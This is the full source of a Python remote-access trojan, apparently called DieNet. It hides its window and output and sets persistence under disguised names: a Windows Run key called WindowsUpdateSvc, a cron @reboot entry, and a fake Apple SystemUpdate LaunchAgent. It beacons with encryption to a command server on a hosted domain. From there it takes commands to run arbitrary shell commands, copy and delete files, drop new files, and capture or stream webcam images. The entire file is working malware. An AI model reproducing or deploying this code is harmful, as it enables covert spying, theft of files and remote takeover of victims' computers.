import os
import sys
import json
import time
import base64
import random
import socket
import platform
import psutil
import requests
import subprocess
import threading
import ctypes
import uuid
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib

# ========================= CONFIG =========================
SERVER_URL = "https://velvetteam.pythonanywhere.com"
CHECKIN_INTERVAL = (28, 47)        # Random delay to look natural

AES_KEY = hashlib.sha256(b'dienet-velvetteam-secret-change-this').digest()

HOSTNAME = os.environ.get("COMPUTERNAME", platform.node()) or f"PC-{uuid.getnode():X}"[:15]

FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

# Real webcam support
try:
    import cv2
    HAS_CV2 = True
except:
    HAS_CV2 = False

streaming = False
stream_thread = None

# ====================== STEALTH ======================
def hide_everything():
    """Completely hide console / output"""
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    # Redirect stdout/stderr to null (no prints ever)
    try:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    except:
        pass

def add_persistence():
    sys_name = platform.system()
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

    if sys_name == "Windows":
        try:
            import winreg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "WindowsUpdateSvc", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg)
        except:
            pass

    elif sys_name == "Linux":
        try:
            cron = f'(crontab -l 2>/dev/null; echo "@reboot nohup {exe_path} >/dev/null 2>&1 &") | crontab -'
            subprocess.run(cron, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    elif sys_name == "Darwin":  # macOS
        plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.SystemUpdate.plist")
        content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.SystemUpdate</string>
    <key>ProgramArguments</key><array><string>{exe_path}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>/dev/null</string>
    <key>StandardErrorPath</key><string>/dev/null</string>
</dict>
</plist>'''
        try:
            os.makedirs(os.path.dirname(plist), exist_ok=True)
            with open(plist, "w") as f:
                f.write(content)
            subprocess.run(["launchctl", "load", "-w", plist], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ====================== CRYPTO ======================
def aes_encrypt(data: dict) -> str:
    iv = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(iv, json.dumps(data).encode(), None)
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(token: str) -> dict:
    try:
        raw = base64.b64decode(token)
        iv, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(AES_KEY)
        return json.loads(aesgcm.decrypt(iv, ct, None))
    except:
        return None

def enc_post(endpoint: str, payload: dict):
    try:
        headers = {"User-Agent": FAKE_UA}
        data = {"enc": aes_encrypt(payload)}
        r = requests.post(f"{SERVER_URL}{endpoint}", json=data, headers=headers, timeout=15)
        if r.status_code == 200 and "enc" in r.json():
            return aes_decrypt(r.json()["enc"])
        return None
    except:
        return None

# ====================== SYSTEM INFO ======================
def get_system_info():
    try:
        cpu = psutil.cpu_percent(interval=0.7)
        ram = psutil.virtual_memory().percent
        disk_path = 'C:\\' if platform.system() == "Windows" else '/'
        disk = psutil.disk_usage(disk_path).percent
        disk_total = psutil.disk_usage(disk_path).total
        disk_free = psutil.disk_usage(disk_path).free

        mac = ':'.join([f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8)][::-1])

        try:
            ip = requests.get('https://api.ipify.org', timeout=5, headers={"User-Agent": FAKE_UA}).text.strip()
        except:
            ip = socket.gethostbyname(socket.gethostname())

        return {
            "hostname": HOSTNAME,
            "ip": ip,
            "mac": mac,
            "os": f"{platform.system()} {platform.release()}",
            "cpu_percent": round(cpu, 1),
            "ram_percent": round(ram, 1),
            "disk_percent": round(disk, 1),
            "disk_total": disk_total,
            "disk_free": disk_free,
            "lat": 0.0, "lon": 0.0, "city": "", "country": "",
            "geo_method": "ip-fallback"
        }
    except:
        return {"hostname": HOSTNAME, "ip": "127.0.0.1", "mac": "00:00:00:00:00:00"}

# ====================== WEBCAM ======================
def take_snapshot():
    if not HAS_CV2:
        return None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 82])
            return base64.b64encode(buffer).decode()
    except:
        pass
    return None

def stream_loop():
    global streaming
    while streaming:
        img = take_snapshot()
        if img:
            enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img})
        time.sleep(4.2)

# ====================== COMMAND HANDLER ======================
def handle_command(cmd: str):
    global streaming, stream_thread
    if not cmd:
        return

    if cmd.startswith("shell:"):
        try:
            result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True, timeout=30)
            output = (result.stdout + result.stderr)[:48000]
        except Exception as e:
            output = f"Error: {str(e)}"
        enc_post("/api/cmdresult", {"hostname": HOSTNAME, "cmd": cmd[6:], "output": output})

    elif cmd == "filelist":
        files = []
        try:
            for root, _, fs in os.walk(os.path.expanduser("~")):
                if len(files) > 350: break
                for name in fs[:25]:
                    full = os.path.join(root, name)
                    try:
                        size = os.path.getsize(full)
                        mod = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full)))
                        files.append({"path": full, "name": name, "is_dir": False, "size": size, "modified": mod})
                    except:
                        pass
        except:
            pass
        enc_post("/api/filelist", {"hostname": HOSTNAME, "files": files})

    elif cmd.startswith("getfile:"):
        path = cmd[8:].strip()
        try:
            if os.path.isfile(path):
                with open(path, "rb") as f:
                    b64 = base64.b64encode(f.read(12 * 1024 * 1024)).decode()   # max ~12MB
                enc_post("/api/pushfile", {"hostname": HOSTNAME, "path": path, "data_b64": b64})
        except:
            pass

    elif cmd.startswith("delete:"):
        path = cmd[7:].strip()
        try:
            if os.path.isfile(path):
                os.remove(path)
        except:
            pass

    elif cmd.startswith("putfile:"):
        resp = enc_post(f"/api/pendingupload/{HOSTNAME}", {})
        if resp and resp.get("status") == "ok":
            try:
                os.makedirs(os.path.dirname(resp["dest_path"]), exist_ok=True)
                with open(resp["dest_path"], "wb") as f:
                    f.write(base64.b64decode(resp["data_b64"]))
            except:
                pass

    elif cmd == "snapshot":
        img = take_snapshot()
        if img:
            enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img})

    elif cmd == "stream_on":
        if not streaming:
            streaming = True
            stream_thread = threading.Thread(target=stream_loop, daemon=True)
            stream_thread.start()

    elif cmd == "stream_off":
        streaming = False

    elif cmd == "uninstall":
        # Remove persistence (best effort)
        if platform.system() == "Windows":
            try:
                import winreg
                key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(reg, "WindowsUpdateSvc")
            except:
                pass
        os._exit(0)

# ====================== MAIN ======================
def main():
    hide_everything()
    add_persistence()

    # Single instance protection (Windows)
    if platform.system() == "Windows":
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DieNetAgentMutex")
            if ctypes.windll.kernel32.GetLastError() == 0xB7:
                sys.exit(0)
        except:
            pass

    while True:
        try:
            info = get_system_info()
            resp = enc_post("/api/checkin", info)

            if resp and resp.get("command"):
                threading.Thread(target=handle_command, args=(resp["command"],), daemon=True).start()

            time.sleep(random.randint(*CHECKIN_INTERVAL))

        except:
            time.sleep(18)

if __name__ == "__main__":
    main()
